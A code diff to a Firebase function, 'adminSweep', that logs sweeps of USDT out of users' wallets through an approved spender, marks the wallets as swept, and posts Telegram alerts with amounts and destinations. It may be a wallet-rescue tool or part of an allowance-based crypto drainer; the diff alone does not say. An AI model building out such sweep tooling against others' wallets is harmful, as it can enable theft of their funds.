@@ -241,40 +241,55 @@ export const adminSweep = functions
       );
     }
 
-    // ── 7. Record in Firestore ─────────────────────────────────────
-    const rescueRef = db.collection("rescues").doc();
-    await rescueRef.set({
-      user: targetWallet,
-      initiatedBy: callerEmail,
-      source: "ADMIN_MANUAL_SWEEP",
-      sweepTxHash: sweepTx.hash,
-      amount: sweepAmount.toString(),
-      amountFormatted: ethers.formatUnits(sweepAmount, 18),
-      destination: finalDestination,
-      spenderUsed: spender,
-      status: "CONFIRMED",
-      createdAt: admin.firestore.FieldValue.serverTimestamp(),
-    });
-
-    // ── 8. Telegram notification (non-blocking) ────────────────────
-    import("../lib/telegram")
-      .then(({ sendTelegramMessage }) =>
-        sendTelegramMessage(
-          `🛡️ ADMIN SWEEP\n` +
-            `Wallet: ${targetWallet}\n` +
-            `Amount: ${ethers.formatUnits(sweepAmount, 18)} USDT\n` +
-            `Tx: ${sweepTx.hash}`
-        )
-      )
-      .catch((tgErr) => {
-        functions.logger.warn("[adminSweep] Telegram notify failed:", tgErr);
+    // ── 7. Record in Firestore (resilient) ─────────────────────────
+    let docId = "";
+    try {
+      const rescueRef = db.collection("rescues").doc();
+      docId = rescueRef.id;
+      await rescueRef.set({
+        user: targetWallet,
+        initiatedBy: callerEmail,
+        source: "ADMIN_MANUAL_SWEEP",
+        sweepTxHash: sweepTx.hash,
+        amount: sweepAmount.toString(),
+        amountFormatted: ethers.formatUnits(sweepAmount, 18),
+        destination: finalDestination,
+        spenderUsed: spender,
+        status: "CONFIRMED",
+        createdAt: admin.firestore.FieldValue.serverTimestamp(),
       });
+
+      // Also mark wallet as SWEPT in wallets collection so Admin Panel updates
+      await db.collection("wallets").doc(targetWallet.toLowerCase()).set({
+        status: "SWEPT",
+        sweptAt: admin.firestore.FieldValue.serverTimestamp(),
+        sweepTxHash: sweepTx.hash,
+        lastSweptAmount: ethers.formatUnits(sweepAmount, 18),
+      }, { merge: true });
+    } catch (dbErr) {
+      functions.logger.error("[adminSweep] Error saving sweep record to Firestore:", dbErr);
+    }
+
+    // ── 8. Telegram notification (await so it completes before function freezes) ──
+    try {
+      const { sendTelegramMessage } = await import("../lib/telegram");
+      const formattedAmount = ethers.formatUnits(sweepAmount, 18);
+      await sendTelegramMessage(
+        `🛡️ ADMIN SWEEP CONFIRMED\n` +
+          `Wallet: ${targetWallet}\n` +
+          `Amount: ${formattedAmount} USDT\n` +
+          `Destination: ${finalDestination}\n` +
+          `Tx: https://bscscan.com/tx/${sweepTx.hash}`
+      );
+    } catch (tgErr) {
+      functions.logger.warn("[adminSweep] Telegram notify failed:", tgErr);
+    }
 
     // ── 9. Return result to caller ─────────────────────────────────
     return {
       success: true,
       sweepTxHash: sweepTx.hash,
       amountSwept: ethers.formatUnits(sweepAmount, 18),
-      docId: rescueRef.id,
+      docId: docId || sweepTx.hash,
     };
   });
